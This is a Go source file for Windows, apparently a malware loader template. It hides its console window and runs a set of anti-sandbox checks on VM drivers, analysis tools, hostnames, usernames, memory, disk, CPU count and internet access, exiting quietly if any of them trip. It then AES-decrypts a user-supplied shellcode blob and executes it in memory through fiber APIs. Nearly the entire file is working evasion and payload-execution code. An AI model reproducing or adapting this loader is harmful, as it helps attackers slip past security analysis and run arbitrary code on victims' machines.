package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	mproc "github.com/D3Ext/maldev/process"
	"golang.org/x/sys/windows"
	"net"
	"os"
	"os/user"
	"runtime"
	"syscall"
	"unsafe"
)

var iv = "0000000000000000"

func PKCS5UnPadding(origData []byte) []byte {
	length := len(origData)
	unpadding := int(origData[length-1])
	return origData[:(length - unpadding)]
}
func ees(decodeStr string, key []byte) ([]byte, error) {
	decodeBytes, err := base64.StdEncoding.DecodeString(decodeStr)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	blockMode := cipher.NewCBCDecrypter(block, []byte(iv))
	origData := make([]byte, len(decodeBytes))

	blockMode.CryptBlocks(origData, decodeBytes)
	origData = PKCS5UnPadding(origData)
	return origData, nil
}

var (
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
	user32   = windows.NewLazySystemDLL("user32.dll")

	getCurrentProcessIdProc      = kernel32.NewProc("GetCurrentProcessId")
	getConsoleWindowProc         = kernel32.NewProc("GetConsoleWindow")
	getWindowThreadProcessIdProc = user32.NewProc("GetWindowThreadProcessId")
	showWindowAsyncProc          = user32.NewProc("ShowWindowAsync")
)

func getCurrentProcessId() (uint32, error) {
	r, _, e := syscall.Syscall(getCurrentProcessIdProc.Addr(), 0, 0, 0, 0)
	if e != 0 {
		return 0, fmt.Errorf("ui: GetCurrentProcessId failed: %d", e)
	}
	return uint32(r), nil
}

func getWindowThreadProcessId(hwnd uintptr) (uint32, error) {
	pid := uint32(0)
	r, _, e := syscall.Syscall(getWindowThreadProcessIdProc.Addr(), 2, hwnd, uintptr(unsafe.Pointer(&pid)), 0)
	if r == 0 {
		return 0, fmt.Errorf("ui: GetWindowThreadProcessId failed: %d", e)
	}
	return pid, nil
}

func getConsoleWindow() (uintptr, error) {
	r, _, e := syscall.Syscall(getConsoleWindowProc.Addr(), 0, 0, 0, 0)
	if e != 0 {
		return 0, fmt.Errorf("ui: GetConsoleWindow failed: %d", e)
	}
	return r, nil
}

func showWindowAsync(hwnd uintptr, show int) error {
	_, _, e := syscall.Syscall(showWindowAsyncProc.Addr(), 2, hwnd, uintptr(show), 0)
	if e != 0 {
		return fmt.Errorf("ui: ShowWindowAsync failed: %d", e)
	}
	return nil
}

func main() {
	const (
		MemCommit       = 0x1000
		MemReserve      = 0x2000
		PageExecuteRead = 0x20
		PageReadwrite   = 0x04
	)
	pid, _ := getCurrentProcessId()

	w, _ := getConsoleWindow()

	cpid, _ := getWindowThreadProcessId(w)

	if pid == cpid {

		showWindowAsync(w, windows.SW_HIDE)
	}
	// 上面代码为 关闭运行黑框

	AutoCheck() //沙箱检测
	var infoList = [...]string{"Aes key", ""} //填入Aes key
	infoList[1] = "" //填入加密后的shellcode
	sc, _ := ees(infoList[1], []byte(infoList[0])) //解密shellcode

	shellcode, _ := hex.DecodeString(string(sc))

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	ConvertThreadToFiber := kernel32.NewProc("ConvertThreadToFiber")
	CreateFiber := kernel32.NewProc("CreateFiber")
	SwitchToFiber := kernel32.NewProc("SwitchToFiber")
	fiberAddr, _, _ := ConvertThreadToFiber.Call()
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MemCommit|MemReserve, PageReadwrite)
	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	oldProtect := PageReadwrite
	_, _, _ = VirtualProtect.Call(addr, uintptr(len(shellcode)), PageExecuteRead, uintptr(unsafe.Pointer(&oldProtect)))
	fiber, _, _ := CreateFiber.Call(0, addr, 0)
	_, _, _ = SwitchToFiber.Call(fiber)
	_, _, _ = SwitchToFiber.Call(fiberAddr)

}

var drivers []string = []string{ // Sandbox drivers taken from https://github.com/LordNoteworthy/al-khaser
	"C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
	"C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
	"C:\\Windows\\System32\\drivers\\VBoxSF.sys",
	"C:\\Windows\\System32\\drivers\\VBoxVideo.sys",
	"C:\\Windows\\System32\\vboxdisp.dll",
	"C:\\Windows\\System32\\vboxhook.dll",
	"C:\\Windows\\System32\\vboxmrxnp.dll",
	"C:\\Windows\\System32\\vboxogl.dll",
	"C:\\Windows\\System32\\vboxoglarrayspu.dll",
	"C:\\Windows\\System32\\vboxservice.exe",
	"C:\\Windows\\System32\\vboxtray.exe",
	"C:\\Windows\\System32\\VBoxControl.exe",
	"C:\\Windows\\System32\\drivers\\vmmouse.sys",
	"C:\\Windows\\System32\\drivers\\vmhgfs.sys",
	"C:\\Windows\\System32\\drivers\\vmmemctl.sys",
	"C:\\Windows\\System32\\drivers\\vmmouse.sys",
	"C:\\Windows\\System32\\drivers\\vmrawdsk.sys",
	"C:\\Windows\\System32\\drivers\\vmusbmouse.sys",
}

var processes []string = []string{ // Sandbox processes taken from https://github.com/LordNoteworthy/al-khaser
	"vboxservice.exe",
	"vboxtray.exe",
	"vmtoolsd.exe",
	"vmwaretray.exe",
	"vmware.exe",
	"vmware-vmx.exe",
	"vmwareuser",
	"VGAuthService.exe",
	"vmacthlp.exe",
	"vmsrvc.exe",
	"vmusrvc.exe",
	"xenservice.exe",
	"qemu-ga.exe",
	"wireshark.exe",
	"Procmon.exe",
	"Procmon64.exe",
	"volatily.exe",
	"volatily3.exe",
	"DumpIt.exe",
	"dumpit.exe",
}

var hostnames_list []string = []string{
	"Sandbox",
	"SANDBOX",
	"malware",
	"virus",
	"Virus",
	"sample",
	"debug",
	"USER-PC",
	"analysis",
	"cuckoo",
	"cuckoofork",
	"Cuckoo",
}

var usernames_list []string = []string{
	"sandbox",
	"virus",
	"malware",
	"debug4fun",
	"debug",
	"sys",
	"user1",
	"Virtual",
	"virtual",
	"analyis",
	"trans_iso_0",
	"j.yoroi",
	"venuseye",
	"VenusEye",
	"VirusTotal",
	"virustotal",
}

type memStatusEx struct { // Auxiliary struct to retrieve total memory
	dwLength     uint32
	dwMemoryLoad uint32
	ullTotalPhys uint64
	ullAvailPhys uint64
	unused       [5]uint64
}

func AutoCheck() error {
	mem_check, err := CheckMemory()
	if err != nil {
		return err
	}

	if mem_check {
		os.Exit(0)
	}

	drivers_check := CheckDrivers()
	if drivers_check {
		os.Exit(0)
	}

	proc_check, err := CheckProcess()
	if err != nil {
		return err
	}

	if proc_check {
		os.Exit(0)
	}

	disk_check, err := CheckDisk()
	if err != nil {
		return err
	}

	if disk_check {
		os.Exit(0)
	}

	internet_check := CheckInternet()
	if internet_check {
		os.Exit(0)
	}

	hostn_check, err := CheckHostname()
	if err != nil {
		return err
	}

	if hostn_check {
		os.Exit(0)
	}

	user_check, err := CheckUsername()
	if err != nil {
		return err
	}

	if user_check {
		os.Exit(0)
	}

	cpu_check := CheckCpu()
	if cpu_check {
		os.Exit(0)
	}

	return nil
}

func CheckMemory() (bool, error) {
	procGlobalMemoryStatusEx := syscall.NewLazyDLL("kernel32.dll").NewProc("GlobalMemoryStatusEx")

	msx := &memStatusEx{
		dwLength: 64,
	}

	r1, _, _ := procGlobalMemoryStatusEx.Call(uintptr(unsafe.Pointer(msx)))
	if r1 == 0 {
		return false, errors.New("An error has ocurred while executing GlobalMemoryStatusEx")
	}

	if msx.ullTotalPhys < 4174967296 {
		return true, nil // May be a sandbox
	} else {
		return false, nil // Not a sandbox
	}
}

func CheckDisk() (bool, error) {
	procGetDiskFreeSpaceExW := syscall.NewLazyDLL("kernel32.dll").NewProc("GetDiskFreeSpaceExW")

	lpTotalNumberOfBytes := int64(0)
	diskret, _, err := procGetDiskFreeSpaceExW.Call(
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("C:\\"))),
		uintptr(0),
		uintptr(unsafe.Pointer(&lpTotalNumberOfBytes)),
		uintptr(0),
	)

	if diskret == 0 {
		return false, err
	}

	if lpTotalNumberOfBytes < 68719476736 {
		return true, nil
	} else {
		return false, nil
	}
}

func CheckInternet() bool {

	_, err := net.Dial("tcp", "223.5.5.5:53")

	if err != nil {
		return true // May be a sandbox
	}

	return false // Not a sandbox
}

func CheckHostname() (bool, error) {
	hostname, err := os.Hostname()
	if err != nil {
		return false, err
	}

	for _, hostname_to_check := range hostnames_list {
		if hostname == hostname_to_check {
			return true, nil // Probably a sandbox
		}
	}

	return false, nil // Not a sandbox
}

func CheckUsername() (bool, error) {
	u, err := user.Current()
	if err != nil {
		return false, err
	}

	for _, username_to_check := range usernames_list {
		if u.Username == username_to_check {
			return true, nil // Probably a sandbox
		}
	}

	return false, nil // Not a sandbox
}

func CheckCpu() bool {
	if runtime.NumCPU() <= 2 {
		return true // Probably a sandbox
	} else {
		return false // Not a sandbox
	}
}

func CheckDrivers() bool {
	for _, d := range drivers { // Iterate over all drivers to check if they exist
		_, err := os.Stat(d)
		if !os.IsNotExist(err) {

			return true // Probably a sandbox
		}
	}

	return false // Not a sandbox
}

func CheckProcess() (bool, error) {
	processes_list, err := mproc.GetProcesses() // Get list of all processes
	if err != nil {
		return false, err
	}

	// Check if at least a quite good amount of processes are running
	if len(processes_list) <= 15 {
		return true, nil // Probably a sandbox
	}

	for _, p := range processes_list {
		for _, p_name := range processes { // Iterate over known VM and sandboxing processes names
			if p.Exe == p_name { // Name matches!
				return true, nil // Probably a sandbox
			}
		}
	}

	return false, nil // Not a sandbox
}

